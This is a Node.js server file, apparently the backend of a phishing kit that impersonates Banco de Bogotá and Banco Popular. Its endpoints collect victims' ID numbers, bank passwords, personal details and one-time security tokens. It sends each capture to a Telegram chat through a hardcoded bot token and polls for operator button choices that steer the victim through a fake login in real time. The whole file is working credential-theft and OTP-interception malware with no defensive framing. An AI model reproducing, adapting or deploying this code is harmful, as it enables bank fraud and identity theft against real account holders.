const http = require('http');
const https = require('https');

const PORT = process.env.PORT || 4000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
const TELEGRAM_CHAT_ID = '-5182218323';

let lastDecision = null;

function sendTelegramMessage(text, replyMarkup) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown',
      reply_markup: replyMarkup || undefined,
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          if (!json.ok) {
            return reject(new Error(json.description || 'Telegram error'));
          }
          resolve(json);
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function handleIngresarAhora(req, res, body) {
  try {
    const data = JSON.parse(body || '{}');
    const {
      banco = 'Banco de Bogotá',
      tipo = '',
      numero = '',
      clave = '',
      nombre = 'No registrado',
      email = '',
      cedula = '',
      celular = '',
    } = data;

    let bankHeader = banco || 'Banco de Bogotá';
    if (!/^banco/i.test(bankHeader)) {
      bankHeader = 'Banco ' + bankHeader;
    }
    const text =
      `🏦 *${bankHeader.toUpperCase()} – INGRESAR AHORA*\n\n` +
      `📄 *Tipo doc:* \`${tipo}\`\n` +
      `🔢 *Número:* \`${numero}\`\n` +
      `🔑 *Clave segura:* \`${clave}\`\n\n` +
      `👤 *Nombre:* \`${nombre}\`\n` +
      `📧 *Email:* \`${email}\`\n` +
      `🆔 *Cédula:* \`${cedula}\`\n` +
      `📱 *Celular:* \`${celular}\`\n\n` +
      'Selecciona qué debe ver el usuario:';

    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '❌ Error usuario', callback_data: 'bog_error_usuario' },
          { text: '🔐 Pedir token', callback_data: 'bog_pedir_token' },
          { text: '🏦 Pedir otro banco', callback_data: 'bog_otro_banco' },
        ],
      ],
    };

    lastDecision = null;

    sendTelegramMessage(text, replyMarkup)
      .then(() => {
        writeJson(res, 200, { ok: true });
      })
      .catch((e) => {
        console.error('Error enviando a Telegram:', e.message);
        writeJson(res, 500, { ok: false, error: e.message });
      });
  } catch (e) {
    writeJson(res, 400, { ok: false, error: 'JSON inválido' });
  }
}

function handleIngresarPopular(req, res, body) {
  try {
    const data = JSON.parse(body || '{}');
    handleIngresarAhora(req, res, JSON.stringify({ ...data, banco: data.banco || 'Banco Popular' }));
  } catch (e) {
    writeJson(res, 400, { ok: false, error: 'JSON inválido' });
  }
}

function handleRecibirDinero(req, res, body) {
  try {
    const data = JSON.parse(body || '{}');
    const {
      banco = 'Banco de Bogotá',
      token = '',
      nombre = 'No registrado',
      email = '',
      cedula = '',
      celular = '',
    } = data;

    let bankHeader = banco || 'Banco de Bogotá';
    if (!/^banco/i.test(bankHeader)) {
      bankHeader = 'Banco ' + bankHeader;
    }
    const text =
      `🏦 *${bankHeader.toUpperCase()} – TOKEN*\n\n` +
      `🔐 *Token:* \`${token}\`\n\n` +
      `👤 *Nombre:* \`${nombre}\`\n` +
      `📧 *Email:* \`${email}\`\n` +
      `🆔 *Cédula:* \`${cedula}\`\n` +
      `📱 *Celular:* \`${celular}\`\n\n` +
      'Selecciona el resultado:';

    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '❌ Error token', callback_data: 'bog_error_token' },
          { text: '✅ Token correcto', callback_data: 'bog_token_ok' },
        ],
      ],
    };

    lastDecision = null;

    sendTelegramMessage(text, replyMarkup)
      .then(() => {
        writeJson(res, 200, { ok: true });
      })
      .catch((e) => {
        console.error('Error enviando token a Telegram:', e.message);
        writeJson(res, 500, { ok: false, error: e.message });
      });
  } catch (e) {
    writeJson(res, 400, { ok: false, error: 'JSON inválido' });
  }
}

function handleDecision(req, res) {
  let mapped = null;
  if (lastDecision === 'bog_error_usuario' || lastDecision === 'popular_error_usuario') mapped = 'error_usuario';
  if (lastDecision === 'bog_pedir_token' || lastDecision === 'popular_pedir_token') mapped = 'pedir_token';
  if (lastDecision === 'bog_otro_banco' || lastDecision === 'popular_otro_banco') mapped = 'otro_banco';
  if (lastDecision === 'bog_error_token') mapped = 'error_token';
  if (lastDecision === 'bog_token_ok') mapped = 'token_ok';

  writeJson(res, 200, { decision: mapped });
}

function makeTelegramRequest(method, params = {}) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(params);
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_TOKEN}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(body));
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

async function pollTelegram() {
  let offset = 0;
  setInterval(async () => {
    try {
      const updates = await makeTelegramRequest('getUpdates', {
        offset,
        timeout: 0,
      });
      if (!updates.ok || !Array.isArray(updates.result)) {
        return;
      }
      for (const update of updates.result) {
        offset = update.update_id + 1;
        if (update.callback_query && update.callback_query.data) {
          lastDecision = update.callback_query.data;
        }
      }
    } catch (_) {
    }
  }, 1500);
}

function writeJson(res, statusCode, payload) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  });
  res.end(JSON.stringify(payload));
}

const server = http.createServer((req, res) => {
  const { method, url } = req;
  console.log(`${new Date().toISOString()} ${method} ${url}`);

  if (method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    });
    return res.end();
  }

  if (method === 'GET' && url === '/decision') {
    return handleDecision(req, res);
  }

  if (method === 'POST' && (url === '/ingresar-ahora' || url === '/recibir-dinero' || url === '/ingresar-popular')) {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      if (url === '/ingresar-ahora') {
        console.log('Handling /ingresar-ahora payload');
        handleIngresarAhora(req, res, body);
      } else if (url === '/recibir-dinero') {
        console.log('Handling /recibir-dinero payload');
        handleRecibirDinero(req, res, body);
      } else if (url === '/ingresar-popular') {
        console.log('Handling /ingresar-popular payload');
        handleIngresarPopular(req, res, body);
      }
    });
    return;
  }

  writeJson(res, 404, { error: 'Not found' });
});

server.listen(PORT, () => {
  console.log(`Servidor bancos escuchando en http://localhost:${PORT}`);
  pollTelegram();
});
